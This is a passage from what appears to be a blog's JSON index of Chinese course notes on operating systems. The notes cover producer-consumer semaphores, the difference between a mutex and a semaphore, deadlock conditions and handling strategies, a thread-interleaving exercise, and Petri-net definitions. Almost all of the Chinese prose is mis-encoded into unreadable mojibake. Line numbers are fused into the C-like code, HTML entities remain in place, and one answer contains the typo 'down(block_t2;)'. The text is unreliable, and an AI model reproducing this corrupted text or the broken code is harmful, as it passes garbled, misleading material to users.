é—®é¢˜å‡ºåœ¨æ²¡æœ‰èƒ½å¤Ÿååº”å½“å‰ç¼“å†²åŒºæ˜¯å¦æ»¡æˆ–è€…æ˜¯ç©ºçš„çŠ¶æ€ã€‚ å‡å¦‚Producerè¿›å…¥äº†æ»¡çš„ç¼“å†²åŒºï¼Œé‚£ä¹ˆå®ƒæ— æ³•è¿›è¡Œå†™å…¥æ“ä½œï¼Œä¹Ÿå°±æ— æ³•è¿›è¡Œåç»­çš„ up(&amp;wa) ã€‚å®ƒä¼šå¡åœ¨è¿™é‡Œï¼Œå¹¶ä¸”Consumerä¹Ÿæ— æ³•è¿›æ¥è¯»å–æ•°æ®ã€‚ é‚£ä¹ˆè¯¥å¦‚ä½•æ­£ç¡®åœ°è§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼š æˆ‘ä»¬éœ€è¦åœ¨æ­¤åŸºç¡€ä¸Šæ·»åŠ 2ä¸ªä¿¡å·é‡ï¼š ä¸€ä¸ªç”¨äºè¡¨ç¤ºå½“å‰çš„ç¼“å†²åŒºå·²æ»¡ï¼švollï¼Œåˆå§‹åŒ–ä¸º0 ä¸€ä¸ªç”¨äºè¡¨ç¤ºå½“å‰çš„ç¼“å†²åŒºå‰©ä½™çš„ä½ç½®ï¼šleerï¼Œåˆå§‹åŒ–ä¸ºnï¼Œn æ˜¯ç¼“å†²åŒºå¤§å°ã€‚ 123456789/* Producer */while (true) &#123; element = produce(); // ç”Ÿäº§æ•°æ® down(&amp;leer); // ç­‰å¾…æœ‰ç©ºä½ down(&amp;wa); // è¯·æ±‚è¿›å…¥ç¼“å†²åŒºï¼ˆäº’æ–¥ï¼‰ write_to_buf(W, element); // å†™å…¥ç¼“å†²åŒº up(&amp;wa); // é‡Šæ”¾äº’æ–¥é” up(&amp;voll); // å¢åŠ â€œå·²æ»¡â€è®¡æ•°&#125; 123456789/* Consumer */while (true) &#123; down(&amp;voll); // ç­‰å¾…æœ‰æ•°æ®å¯è¯» down(&amp;wa); // è¯·æ±‚è¿›å…¥ç¼“å†²åŒºï¼ˆäº’æ–¥ï¼‰ element = read_from_buf(W); // è¯»å–æ•°æ® up(&amp;wa); // é‡Šæ”¾äº’æ–¥é” up(&amp;leer); // å¢åŠ â€œç©ºä½â€è®¡æ•° consume(element); // æ¶ˆè´¹æ•°æ®&#125; äº’æ–¥é”ï¼ˆMutexï¼‰Mutexç±»ä¼¼äºäºŒè¿›åˆ¶ä¿¡å·é‡ï¼ˆbinary semaphoreï¼‰ï¼Œåªæœ‰2ä¸ªçŠ¶æ€ï¼šunlocked å’Œ lockedã€‚ æ³¨æ„ï¼šå¯ä»¥å°†Mutexå½“æˆ2å…ƒä¿¡å·é‡æ¥ç†è§£ï¼Œä½†æ˜¯è¦æ¸…æ¥šä»–ä»¬ä¸¥æ ¼æ¥è®²å¹¶ä¸ä¸€æ ·ã€‚æœ€å¤§çš„åŒºåˆ«ä¾¿æ˜¯æ‹¥æœ‰æƒï¼š äº’æ–¥é”ï¼ˆMutexï¼‰åªèƒ½ç”±è·å–é”çš„å®ä½“ï¼ˆEntityï¼‰è¿›è¡Œè§£é”ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒæœ‰ä¸€ä¸ªOwnerï¼‰ã€‚ ä¿¡å·é‡ï¼ˆSemaphoreï¼‰æ²¡æœ‰ Owner çš„æ¦‚å¿µã€‚ ç¼–ç¨‹è¯­è¨€å±‚é¢ç›‘è§†å™¨ï¼ˆMonitoreï¼‰å±äºæ¯”ä¿¡å·é‡ï¼ˆSemaphoreï¼‰æ›´é«˜çº§çš„æŠ½è±¡å±‚çº§ã€‚ ç›‘è§†å™¨å°†æ•°æ®å’Œå¯¹æ•°æ®çš„è®¿é—®æ“ä½œå°è£…åœ¨ä¸€èµ·ï¼Œå®ç°è‡ªåŠ¨åŒæ­¥ï¼Œç¼–è¯‘å™¨åˆ™è´Ÿè´£ç”Ÿæˆåº•å±‚çš„ä¿¡å·é‡åŠå…¶ä½¿ç”¨ä»£ç ã€‚ ç®€å•æ¥è®²å°±æ˜¯ç›‘è§†å™¨ï¼ˆMonitoreï¼‰ä¼šæŠŠäº’æ–¥è®¿é—®è¿™ä¸€éƒ¨åˆ†å°è£…æˆä¸€ä¸ªé»‘ç›’ï¼ˆBlack Boxï¼‰ï¼Œä½¿ç”¨æ—¶åªéœ€è°ƒç”¨æ¥å£ï¼Œä¸éœ€è¦å…³å¿ƒåº•å±‚æ˜¯æ€ä¹ˆåŠ é”ã€è§£é”çš„ã€‚è¿™æ ·ä¸€æ¥ä¹Ÿæ›´ä¸å®¹æ˜“å‡ºé”™ã€‚ ä¸€èˆ¬ä½¿ç”¨å®šä¹‰å¥½çš„æ“ä½œ Produce å’Œ Consume æ¥è°ƒç”¨ç›‘è§†å™¨ï¼ˆMonitoreï¼‰ã€‚ ä¾‹å­ï¼šSpeisende Philosophenï¼ˆDining Philosophersï¼‰æ­»é”ï¼ˆDeadlockï¼‰æ­»é”ï¼ˆDeadlockï¼‰æè¿°çš„æ˜¯ä¸€ç»„è¿›ç¨‹é‡Œæ¯ä¸ªè¿›ç¨‹éƒ½åœ¨ç­‰å¾…ä¸€ä¸ªäº‹ä»¶å‘ç”Ÿï¼Œä½†è¿™ä¸ªäº‹ä»¶åªèƒ½ç”±å…¶ä»–ç­‰å¾…ä¸­çš„è¿›ç¨‹è§¦å‘ã€‚ æ¯”å¦‚è¯´Aå’ŒBå»å›¾ä¹¦é¦†å€Ÿä¹¦ï¼ŒAå·²ç»å€Ÿäº†xï¼ŒBå·²ç»å€Ÿäº†yã€‚ä½†ç°åœ¨Aæƒ³å€Ÿyï¼ŒBæƒ³å€Ÿxã€‚åªä¸è¿‡åŒæ–¹éƒ½å¸Œæœ›å€Ÿåˆ°æ–°ä¹¦äº†ä¹‹åå†æŠŠæ‰‹ä¸Šç°æœ‰çš„è¿™æœ¬è¿˜å›å»ã€‚è¿™æ ·å°±ä¼šé™·å…¥åƒµå±€ï¼Œä¹Ÿå°±æ˜¯æ­»é”ã€‚ ä¾‹å­ï¼š 1234567void process_A(void) &#123; down(&amp;sema_resource_1); // è¯·æ±‚èµ„æº R1 down(&amp;sema_resource_2); // è¯·æ±‚èµ„æº R2 use_both_resources(); // ä½¿ç”¨ä¸¤ä¸ªèµ„æº up(&amp;sema_resource_2); // é‡Šæ”¾ R2 up(&amp;sema_resource_1); // é‡Šæ”¾ R1&#125; 1234567void process_B(void) &#123; down(&amp;sema_resource_2); // è¯·æ±‚èµ„æº R2 down(&amp;sema_resource_1); // è¯·æ±‚èµ„æº R1 use_both_resources(); // ä½¿ç”¨ä¸¤ä¸ªèµ„æº up(&amp;sema_resource_1); // é‡Šæ”¾ R1 up(&amp;sema_resource_2); // é‡Šæ”¾ R2&#125; å‡ºç°æ­»é”ï¼ˆDeadlockï¼‰çš„å……è¦æ¡ä»¶ï¼ˆNotwendige und hinreichende Bedingungenï¼‰ï¼š äº’æ–¥ä½¿ç”¨èµ„æºï¼ˆExklusiv nutzbare Ressourceï¼ŒMutual Exclusionï¼‰ å…±äº«èµ„æºä¸å¯åŒæ—¶è¢«å¤šä¸ªè¿›ç¨‹è®¿é—®ã€‚ å æœ‰ä¸”ç­‰å¾…ï¼ˆBelegen und Anfordernï¼ŒHold and Waitï¼‰ è¿›ç¨‹å·²ç»æŒæœ‰èµ„æºï¼Œè¿˜è¦ç»§ç»­è¯·æ±‚å…¶ä»–èµ„æºã€‚ ä¸å¯æŠ¢å ï¼ˆNicht Entziehbarï¼ŒNo Preemptionï¼‰ èµ„æºä¸èƒ½è¢«å¼ºè¡Œæ‹¿èµ°ï¼ˆè¢«ç³»ç»ŸæŠ¢å›ï¼‰ï¼Œåªèƒ½è‡ªå·±é‡Šæ”¾ã€‚ å¾ªç¯ç­‰å¾…ï¼ˆZyklische Wartebedingungï¼ŒCircular Waitï¼‰ è‡³å°‘ä¸¤ä¸ªæˆ–æ›´å¤šè¿›ç¨‹å½¢æˆä¸€ä¸ªå¾ªç¯ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½åœ¨ç­‰å¾…å¦ä¸€ä¸ªè¿›ç¨‹æ‰€æŒæœ‰çš„èµ„æºã€‚ ï¼ˆæ­»é”æ˜¯ç­‰ä»·äºè¿™4ä¸ªæ¡ä»¶åŒæ—¶æ»¡è¶³çš„ã€‚ï¼‰ å»ºæ¨¡æœ‰å‘å›¾ Belegungsanforderungsgraphenï¼š ç‚¹ åœ†åœˆè¡¨ç¤ºè¿›ç¨‹ï¼Œ æ–¹å½¢è¡¨ç¤ºèµ„æº è¾¹ è¿›ç¨‹Aå ç”¨ï¼ˆbelegtï¼‰èµ„æºRï¼šRåˆ°Açš„è¾¹ è¿›ç¨‹Aæƒ³è¦ï¼ˆfordertï¼‰èµ„æºRï¼šAåˆ°Rçš„è¾¹ ä¾‹å­ï¼š Deadlocksçš„åº”å¯¹ç­–ç•¥ä¸»è¦æœ‰4ç§ç­–ç•¥ï¼š å¿½è§†ï¼ˆIgnorierenï¼‰ æ£€æµ‹ï¼ˆDeadlock-Detection ï¼ŒErkennungï¼‰ åˆ†é…èµ„æºåæ£€æµ‹/æ¨¡æ‹Ÿæ˜¯å¦ä¼šäº§ç”Ÿæ­»é”ï¼Œå¦‚æœä¼šçš„è¯å°±å›æ¡£ã€‚ é¿å…ï¼ˆDeadlock-Avoidanceï¼ŒVermeidungï¼‰ åˆ†é…èµ„æºå‰æ¨¡æ‹Ÿæ˜¯å¦ä¼šäº§ç”Ÿæ­»é” ä½¿ç”¨ Bankier-Algorithmus é¢„é˜²ï¼ˆDeadlock-Preventionï¼ŒVerhinderungï¼‰ è®¾è®¡çš„æ—¶å€™å°±é¿å…æ­»é”å‡ºç°ï¼Œç¡®ä¿ä¸Šé¢çš„4ä¸ªæ¡ä»¶è‡³å°‘æœ‰ä¸€æ¡ä¸ä¼šå‡ºç°ã€‚ å¯¹æ¯”ï¼š ç­–ç•¥ç±»å‹ æ–¹æ³• ä¼˜ç‚¹ ç¼ºç‚¹ è¯†åˆ«ï¼ˆErkennungï¼‰ å‘¨æœŸæ€§æ£€æµ‹ï¼ˆPeriodischer Aufrufï¼‰ å¯äº¤äº’å¼å“åº”ï¼ˆInteraktive Reaktionï¼‰ å¯èƒ½é€šè¿‡ä¸­æ­¢é€ æˆæŸå¤±ï¼ˆVerlust durch Abbruchï¼‰ é¿å…ï¼ˆVermeidungï¼‰ é“¶è¡Œå®¶ç®—æ³•ï¼ˆBankiers-Algorithmusï¼‰ æ— éœ€èµ„æºæŠ¢å ï¼ˆKein Ressourcenzugï¼‰ éœ€è¦æå‰çŸ¥é“æœªæ¥èµ„æºéœ€æ±‚ï¼ˆZukÃ¼nftiger Bedarf muss bekannt seinï¼‰ é¢„é˜²ï¼ˆVerhinderungï¼‰ èµ„æºåˆ†é…é‡‡ç”¨å›ºå®šé¡ºåºï¼ˆFeste Reihenfolge bei Zuteilungï¼‰ æ— éœ€è¿è¡Œæ—¶æ£€æŸ¥ï¼ˆKeine LaufzeitprÃ¼fungenï¼‰ é™æ€ã€ä¸çµæ´»ï¼ˆStatisch, inflexibelï¼‰ ä¸€æ¬¡æ€§åˆ†é…æ‰€æœ‰èµ„æºï¼ˆAlle Ressourcen auf einmal zuteilenï¼‰ ä¸éœ€è¦èµ„æºæŠ¢å ï¼ˆKein Ressourcenzug notwendigï¼‰ æ•ˆç‡ä½ï¼ˆIneffizientï¼‰ ä¾‹é¢˜ä¾‹é¢˜1å‡è®¾ç°åœ¨æœ‰2ä¸ªçº¿ç¨‹å¹¶è¡Œè¿è¡Œï¼Œå¹¶ä¸”å…±äº«å†…å­˜ï¼ˆShared Memoryï¼‰ä¸­çš„xå’Œyè¢«åˆå§‹åŒ–ä¸º0ï¼š 1234// Thread 1if (y &gt;= 0)&#123; x = x+1; //atomic&#125; 1234// Thread 2while (x &lt;= 0 &amp;&amp; y &gt; -3)&#123; y = y-1; //atomic&#125; é—®é¢˜1ï¼šç»™å‡ºæ‰€ä»¥å¯èƒ½çš„ç»“æœç»„åˆã€‚ï¼ˆWas sind alle mÃ¶glichen Kombinationen der Werte fÃ¼r x und y nach der nicht-deterministsichen AusfÃ¼hrung der obenstehenden Threadds?ï¼‰ é¦–å…ˆå‡è®¾ä¸€å¼€å§‹å…ˆåªè¿è¡ŒThread 2ï¼Œç­‰ç»“æŸäº†ä¹‹ååœ¨è¿è¡ŒThread 1ï¼Œè¿™æ—¶ $y=-3$ï¼Œå·²ç»ä¸æ»¡è¶³Thread 1é‡Œçš„ if æ¡ä»¶äº†ï¼Œæ‰€ä»¥ç»“æœä¸º $(x,y)=(0,-3)$ ã€‚ å‡è®¾å…ˆåªè¿è¡ŒThread 1ï¼Œç­‰å®Œå…¨ç»“æŸäº†ä¹‹åå†è¿è¡ŒThread 2ï¼Œè¿™æ—¶ $x=1$ ï¼Œå·²ç»ä¸æ»¡è¶³Thread 2é‡Œçš„ while æ¡ä»¶äº†ï¼Œæ‰€ä»¥ç»“æœä¸º $(x,y)=(1,0)$ ã€‚ å‡è®¾Thread 1ï¼Œ2å…ˆè¯»å–äº† $x,y=0$ ï¼Œç„¶åå„è‡ªè¿è¡Œäº†ä¸€æ¬¡ï¼Œè¿™æ—¶ $(x,y)=(1,-1)$ ï¼Œéƒ½ä¸æ»¡è¶³åˆ¤æ–­æ¡ä»¶äº†ï¼Œæ‰€ä»¥2ä¸ªéƒ½ç»“æŸï¼Œç»“æœä¸º $(x,y)=(1,-1)$ã€‚ å‡è®¾Thread 1ï¼Œ2å…ˆè¯»å–äº† $x,y=0$ ï¼Œç„¶å Thread 2 å…ˆè¿è¡Œäº†2æ¬¡ ï¼ˆè¿™æ—¶ $y=-2$ï¼‰ï¼Œç„¶å Thread 1 è¿è¡Œäº†1æ¬¡ï¼Œé‚£ä¹ˆç»“æœä¸º $(x,y)=(1,-2)$ ã€‚ å‡è®¾Thread 1ï¼Œ2å…ˆè¯»å–äº† $x,y=0$ ï¼Œç„¶å Thread 2 å…ˆè¿è¡Œäº†3æ¬¡ ï¼ˆè¿™æ—¶ $y=-3$ï¼‰ï¼Œç„¶å Thread 1 è¿è¡Œäº†1æ¬¡ï¼Œé‚£ä¹ˆç»“æœä¸º $(x,y)=(1,-3)$ ã€‚ æ‰€ä»¥ç­”æ¡ˆä¸ºï¼š x y 0 -3 1 0 1 -1 1 -2 1 -3 é—®é¢˜2ï¼šç°åœ¨è¯¥æ€ä¹ˆåˆ©ç”¨Semaphorenå’ŒMutexï¼ˆé™é‡3ä¸ªåŠä»¥å†…ï¼‰ä½¿å¾—æœ€ç»ˆç»“æœä¸º $x=1, y=-1$ï¼Ÿ å›é¡¾ä¸€ä¸‹ä¸Šé¢çš„é€»è¾‘ï¼Œæƒ³è¦å¾—åˆ°è¿™ä¸ªç»“æœéœ€è¦è®© Thread 1ï¼Œ2å…ˆè¯»å– $x,y=0$ ï¼Œç„¶åå„è‡ªè¿è¡Œä¸€æ¬¡ã€‚ æˆ‘ä»¬è¿™é‡Œéœ€è¦åˆ©ç”¨Mutexè®¾ç½®2é“åï¼š åœ¨åš if æˆ–è€… while åˆ¤æ–­å‰è®¾ç½®ä¸€é“ åœ¨ Thread 2 çš„whileå¾ªç¯å†…çš„ç»“å°¾è®¾ç½®ä¸€ä¸ª è¿™æ ·ä¸€æ¥å¯ä»¥ç¡®ä¿åŒæ–¹éƒ½å…ˆè¯»å– $x,y=0$ ï¼Œç„¶åè¿è¡Œä¸€æ¬¡ Thread 2ä¹‹åè¿è¡Œ Thread 1ã€‚æœ€ç»ˆå¾—åˆ° $x=1, y=-1$ ã€‚ ç­”æ¡ˆï¼š Innitialisierungsblock 12block_t1(0)block_t2(0) Codeblock 12345678910// Thread 1if (y &gt;= 0)&#123; up(block_t2); // å…ˆç­‰Thread 1 é€šè¿‡çš„ifçš„åˆ¤æ–­å†æ”¾è¡Œ Thread 2 down(block_t1); x = x + 1; up(block_t2);&#125; 123456789// Thread 2down(block_t2;)while (x &lt;= 0 &amp;&amp; y &gt; -3)&#123; y = y-1; up(block_t1); down(block_t2); // å…ˆç­‰ Thread 2 è¿è¡Œäº†ä¸€æ¬¡ä¹‹åå†è¿è¡Œ Thread 1&#125; å…ˆè®©t1é€šè¿‡ifåˆ¤æ–­ï¼Œç„¶åblockierenã€‚è¿™æ—¶t2é€šè¿‡wihleåˆ¤æ–­å¹¶è¿›è¡Œä¸€è½®æ“ä½œï¼Œæ¥ç€å†è¿›è¡Œt1çš„æ“ä½œã€‚t1æ“ä½œå®Œå†é€šçŸ¥t2å¯ä»¥è¿›è¡Œåç»­æ“ä½œï¼ˆå³è¿›è¡Œç¬¬äºŒæ¬¡çš„whileçš„åˆ¤æ–­ï¼‰ã€‚","categories":[{"name":"TUM info è¯¾ç¨‹ç¬”è®°","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS æ“ä½œç³»ç»Ÿ","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/GBS-æ“ä½œç³»ç»Ÿ","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"Mutex","slug":"Mutex","permalink":"https://archer-baiyi.github.io/tags/Mutex/"},{"name":"Semaphore","slug":"Semaphore","permalink":"https://archer-baiyi.github.io/tags/Semaphore/"}]},{"title":"GBS 4 Modellierung Paralleler Systeme å¹¶è¡Œç³»ç»Ÿå»ºæ¨¡","slug":"TUM info ç¬”è®°/GBS/GBS-4-Modellierung-Paralleler-Systeme-å¹¶è¡Œç³»ç»Ÿå»ºæ¨¡","date":"2025-04-03T21:20:18.000Z","updated":"2025-04-26T18:30:55.451Z","comments":true,"path":"2025/04/03/TUM info ç¬”è®°/GBS/GBS-4-Modellierung-Paralleler-Systeme-å¹¶è¡Œç³»ç»Ÿå»ºæ¨¡/","permalink":"https://archer-baiyi.github.io/2025/04/03/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-4-Modellierung-Paralleler-Systeme-%E5%B9%B6%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%BB%BA%E6%A8%A1/","excerpt":"æ“ä½œç³»ç»ŸåŸºç¡€ç›¸å…³ç¬”è®°","text":"Parallele Systemeå¹¶è¡Œç³»ç»Ÿï¼ˆParallele Systemeï¼‰çš„ä¸€äº›ç‰¹æ€§ï¼ˆEigenschaftenï¼‰ï¼š ç¡®å®šæ€§ï¼ˆDeterminiertheitï¼‰ï¼š åœ¨ç›¸åŒæ¡ä»¶ä¸‹ï¼Œäº§ç”Ÿç›¸åŒçš„ç»“æœã€‚ æ— å¹²æ‰°æ€§ï¼ˆStÃ¶rungsfreiheitï¼‰ï¼š åœ¨éµå®ˆæ—¢å®šçš„å¹¶è¡Œäº‹ä»¶æ‰§è¡Œé¡ºåºçš„å‰æä¸‹ï¼Œç»“æœä¸å—å½±å“ã€‚ äº’æ–¥è®¿é—®èµ„æºï¼ˆWechselseitiger Ausschluss exklusiv nutzbarerer Ressourcenï¼Œmutual exclusionï¼‰ï¼š æ¯ä¸€æ—¶åˆ»æœ€å¤šåªæœ‰ä¸€ä¸ªè¿›ç¨‹å¯ä»¥è®¿é—®å…±äº«èµ„æºï¼ˆè¯¥èµ„æºè¢«ç‹¬å ä½¿ç”¨ï¼‰ã€‚ æ— æ­»é”ï¼ˆVerklemmungsfreiheitï¼ŒDeadlock freeï¼‰ï¼š æ²¡æœ‰å¤šä¸ªè¿›ç¨‹é—´çš„å¾ªç¯ç­‰å¾…æƒ…å†µã€‚ æ— é¥¥é¥¿ï¼ˆKein Verhungernï¼ŒStarvation freeï¼‰ï¼š ä¸ä¼šæœ‰è¿›ç¨‹å› ä¸ºè¢«ä¸€ç›´æ¨è¿Ÿæ‰§è¡Œè€Œæ°¸è¿œå¾—ä¸åˆ°èµ„æºã€‚ æˆ‘ä»¬è¿™é‡Œä¸»è¦å…³æ³¨ä¸€ä¸ªç”¨äºå½¢å¼å»ºæ¨¡çš„æ–¹æ³•ï¼šPetri-Netzeã€‚ Petri-NetzePetri-Netzeä¸»è¦æ˜¯å…³æ³¨çŠ¶æ€ä»¥åŠçŠ¶æ€å˜åŒ–ï¼ˆZustÃ¤nden und ZustandsÃ¼berg.ngenï¼‰ã€‚ é¦–å…ˆå…ˆæ¥çœ‹å®šä¹‰ï¼š ä¸€ä¸ª Petri ç½‘æ˜¯ä¸€ä¸ªä¸‰å…ƒç»„ (S, T, F)ï¼Œå…¶ä¸­ï¼š Sï¼šæœ‰é™é›†åˆï¼Œç§°ä¸ºâ€œStellenâ€ï¼ˆä½ç½® / çŠ¶æ€ï¼‰ ç”¨åœ†åœˆè¡¨ç¤ºã€‚ è¡¨ç¤ºè¢«åŠ¨å…ƒç´ ï¼Œä¾‹å¦‚ï¼šå­˜å‚¨å•å…ƒã€èµ„æºã€‚ Tï¼šæœ‰é™é›†åˆï¼Œç§°ä¸ºâ€œTransitionenâ€ï¼ˆå˜è¿ / è½¬æ¢ï¼‰ ç”¨çŸ©å½¢è¡¨ç¤ºã€‚ è¡¨ç¤ºä¸»åŠ¨å…ƒç´ ï¼Œä¾‹å¦‚ï¼šå¤„ç†å™¨ã€äº‹ä»¶ã€è¿‡ç¨‹ã€‚ Fï¼šæµå…³ç³»ï¼ˆFlussrelationï¼‰ $F \\subseteq (S \\times T) \\cup (T \\times S)$ ç”¨æœ‰å‘è¾¹ï¼ˆgerichtete Kantenï¼‰è¡¨ç¤ºã€‚ å¹¶ä¸”æ»¡è¶³ï¼š$S \\cap T = \\emptyset$ ã€‚ æ¯ä¸ªKnote $x \\in (S \\cup T)$çš„ Vorbedingung æŒ‡çš„æ˜¯ï¼š$\\bullet x := \\{ \\ y \\ | \\ y \\ F \\ x\\ \\}$ï¼Œå³èƒ½åˆ°xçš„ç‚¹ Nachbedingung æŒ‡çš„æ˜¯ï¼š$ x \\bullet := \\{ \\ y \\ | \\ x \\ F \\ y\\ \\}$ï¼Œå³xèƒ½åˆ°çš„ç‚¹ã€‚ ä¾‹å­ï¼š å’Œå…¶ä»–çš„å»ºå›¾ä¸€æ ·ï¼Œæˆ‘ä»¬è¿™é‡Œä¹Ÿå¯ä»¥å®šä¹‰å¸¦æœ‰æ ‡è®°ï¼ˆå³å®¹é‡ï¼Œæƒé‡ç­‰ï¼‰çš„å›¾ï¼š KapazitÃ¤t einer Stelleï¼š$c : S \\to \\mathbb{N}_0 \\cup \\{\\infty\\}$ å¦‚æœæ²¡æœ‰ä¸“é—¨æ ‡è®°å‡ºæ¥ï¼Œåˆ™é»˜è®¤ $\\infty$ã€‚ Gewichtung einer Kanteï¼š$w : F \\to \\mathbb{N}_0$ å¦‚æœæ²¡æœ‰ä¸“é—¨æ ‡è®°å‡ºæ¥ï¼Œåˆ™é»˜è®¤ $1$ã€‚ ä¸€ä¸ªä½ç½®-å˜è¿ç½‘ï¼ˆStellen-Transitionsnetzï¼‰é‡Œé™¤äº†ä¸Šé¢æåˆ°çš„2ä¸ªå‡½æ•°è¿˜éœ€è¦ä¸€ä¸ªå‡½æ•° $M : S \\to \\mathbb{N}_0 \\cup \\{\\infty\\}$ ç”¨äºæè¿°å›¾å½“å‰çš„çŠ¶æ€ï¼ˆAktuelle Belegung des Netzesï¼‰ï¼Œå³æ¯ä¸ªStelleé‡Œçš„Tokenæ•°é‡ã€‚ éœ€è¦æ»¡è¶³ $\\forall s \\in S: M(s) \\leq c(s)$ã€‚ ä¸€ä¸ªä½ç½®-å˜è¿ç½‘ï¼ˆStellen-Transitionsnetzï¼‰å«åšBedingungs/Ereignisnetz æˆ– Boolesches Netzï¼ˆå¸ƒå°”ç½‘ç»œï¼‰ï¼Œå½“$M : S \\to \\mathbb{B}$ ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯ä¸ªStelleé‡Œæœ€å¤šå¯ä»¥æœ‰1ä¸ªTokenã€‚ è§¦å‘è§„åˆ™ï¼ˆSchaltregelï¼‰ä¸€å¼€å§‹æˆ‘ä»¬å°±æåˆ°ï¼Œæˆ‘ä»¬çš„å…³æ³¨ç‚¹ä¸»è¦æ˜¯ç³»ç»Ÿçš„çŠ¶æ€ä»¥åŠçŠ¶æ€çš„å˜åŒ–ã€‚åœ¨å‰é¢ä»‹ç»çš„å†…å®¹ä¸­ï¼Œå‡½æ•° $M$ è¢«ç”¨æ¥æè¿°ç³»ç»Ÿçš„å½“å‰çŠ¶æ€ï¼Œè€Œæˆ‘ä»¬å¸Œæœ›é€šè¿‡ $T$ï¼ˆå³Transitionençš„é›†åˆï¼‰æ¥æè¿°çŠ¶æ€çš„å˜åŒ–è¿‡ç¨‹ã€‚ä¸è¿‡ï¼Œä»»ä½•çŠ¶æ€çš„å˜åŒ–éƒ½å¿…é¡»æ»¡è¶³ä¸€å®šçš„å‰ææ¡ä»¶ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬å°±æ¥çœ‹çœ‹ï¼Œåœ¨ Petri ç½‘ä¸­ï¼Œè¿™äº›æ¡ä»¶æ˜¯å¦‚ä½•è¢«å®šä¹‰çš„ã€‚ ç»™å®šä¸€ä¸ªä½ç½®-å˜è¿ç½‘ï¼ˆStellen-Transitionsnetzï¼‰ï¼Œå³ä¸€ä¸ªPetri-Netz (S, T, F)ï¼Œå‡½æ•° $c, w, M$ã€‚ ä¸€ä¸ªTransition $t \\in T$ å¯ä»¥è§¦å‘ï¼ˆkann schaltenï¼‰å½“ï¼š $\\forall s \\in \\bullet t: M(s) \\geq w(s, t) $ $\\forall s \\in t\\bullet: M(s) \\leq c(s) - w(t, s)$ å³å½“ï¼š åˆ° t çš„Stelleé‡Œæœ‰è¶³å¤Ÿçš„Tokenï¼ˆè‡³å°‘ $w(s, t)$ ä¸ªï¼‰ t èƒ½åˆ°çš„æ‰€æœ‰Stelleé‡Œæœ‰è¶³å¤Ÿçš„ç©ºä½ç»™ $w(t, s)$ ä¸ªToken æ—¶æ‰èƒ½è§¦å‘ t ã€‚ è¿™ä¸ªtè§¦å‘åæ•´ä¸ªå›¾çš„çŠ¶æ€ä¼šå˜æˆ$Mâ€™$ï¼š $\\forall s \\in \\bullet t \\setminus t\\bullet: Mâ€™(s) = M(s) - w(s, t)$ $\\forall sâ€™ \\in t\\bullet \\setminus \\bullet t: Mâ€™(sâ€™) = M(sâ€™) + w(t, sâ€™)$ $\\forall sâ€™â€™ \\in \\bullet t \\cap t\\bullet: Mâ€™(sâ€™â€™) = M(sâ€™â€™) - w(sâ€™â€™, t) + w(t, sâ€™â€™)$ ä¾‹å­ï¼š å› ä¸ºæ²¡æœ‰ä¸“é—¨æ ‡è®°å‡ºæ¥ï¼Œæ‰€ä»¥é»˜è®¤KapazitÃ¤tæ˜¯ $\\infty$ï¼ŒGewichtæ˜¯1ã€‚ ä¸èƒ½Schaltençš„ä¾‹å­ï¼š å› ä¸ºåé¢é‚£é‡Œå·²ç»æ²¡æœ‰ç©ºä½™çš„ä½ç½®äº†ã€‚ è¿™ä¸ªåŒæ ·ä¸è¡Œï¼Œå› ä¸ºè¿™é‡ŒSchaltenéœ€è¦è€ƒè™‘3ä¸ªåœ°æ–¹ï¼š å·¦è¾¹çš„sæ˜¯å¦æœ‰è¶³å¤Ÿçš„ï¼ˆ1ä¸ªï¼‰Tokenæ¥è§¦å‘t å·¦è¾¹çš„sæ˜¯å¦æœ‰è¶³å¤Ÿçš„ç©ºé—²ä½ç½® å³è¾¹çš„sæ˜¯å¦æœ‰è¶³å¤Ÿçš„ç©ºé—²ä½ç½® å¾ˆæ˜æ˜¾ç¬¬äºŒç‚¹å¹¶ä¸æ»¡è¶³ã€‚ æ³¨æ„ï¼Œè¿™é‡Œä¸èƒ½æƒ³ç€è¯´åæ­£å·¦è¾¹çš„tokenä¼šåœ¨è§¦å‘ t çš„æ—¶å€™è¢«æ¶ˆè€—æ‰æ‰€ä»¥å°±æœ‰è¶³å¤Ÿçš„ç©ºé—²ä½ç½®ï¼ï¼ï¼ ä¸€å®šè¦æ‰€æœ‰çš„å‰ææ¡ä»¶éƒ½æ»¡è¶³äº†æ‰èƒ½è§¦å‘ t ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æ€ä¹ˆæ ·å¯ä»¥é€šè¿‡å»ºæ¨¡å‡ºæ¥çš„å›¾åˆ¤æ–­å½“å‰ç³»ç»Ÿçš„ä¸€äº›å±æ€§ï¼š å¹¶å‘æ€§ / å¹¶è¡Œæ€§ï¼ˆNebenlÃ¤ufigkeitï¼ŒConcurrencyï¼‰ä¸¤ä¸ªTransitionnen $t_0$ å’Œ $t_1$ æ˜¯å¹¶å‘çš„ï¼ˆnebenlÃ¤ufigï¼‰ï¼Œå½“å®ƒä»¬å¯ä»¥äº’ä¸å¹²æ‰°åœ°ç‹¬ç«‹è§¦å‘ï¼ˆunabhÃ¤ngig von einander schalten kÃ¶nnen, ohne sich gegenseitig zu beeinflussen.ï¼‰ã€‚ ä¾‹å­ï¼š å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œçš„ $t_1$ å’Œ $t_2$ æ˜¯å¹¶å‘çš„ï¼ˆnebenlÃ¤ufigï¼‰ï¼Œä½† $t_1, t_2$ å’Œ $t_3$ 